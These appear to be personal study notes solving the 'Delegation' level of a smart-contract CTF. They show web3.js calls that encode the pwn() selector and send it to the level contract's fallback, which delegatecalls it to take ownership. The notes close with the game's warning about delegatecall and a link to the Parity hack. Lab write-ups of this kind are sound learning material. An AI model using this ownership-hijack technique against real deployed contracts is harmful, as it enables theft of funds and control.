@@ -1,0 +1,58 @@
+220308 23:43 KST
+I think the point of this is to just send some ether Delegation contract
+and trigger fallback()
+the msg.data should have
+abi.blablabla('pwn()');
+
+Just need to find how abi.encode blablabla is in web3.js
+https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#encodefunctioncall
+
+
+https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#encodefunctionsignature
+
+
+web3.eth.abi.encodeFunctionSignature('pwn()');
+then I get -> "0xdd365b8b"
+"0xdd365b8b"
+    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"  ,to: "0x07a4A92E48A83217084C5fecaEe057D156FE97CA", value: toWei("0.0001"), data : "0xdd365b8b"}).then(function(receipt){
+        console.log(receipt);
+    });
+
+
+web3.eth.abi.encodeFunctionSignature('myMethod(uint256,string)')
+
+
+
+220309 14:18 KST
+web3.eth.abi.encodeFunctionCall({
+    name: 'pwn',
+    type: 'function',
+    inputs: []
+}, []);
+
+this shit also give me 
+"0xdd365b8b"
+
+what am I missing here?
+
+aa, shibal. 220309 14:20
+the fallback function was nonpayable.
+
+    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"  ,to: "0x07a4A92E48A83217084C5fecaEe057D156FE97CA",data : "0xdd365b8b"}).then(function(receipt){
+        console.log(receipt);
+    });
+
+    I just had to send transaction without value!
+
+
+Delegation
+Level completed!
+Difficulty 4/10
+
+Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
+
+Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.
+
+
+Parity wallet hack Explained
+https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/
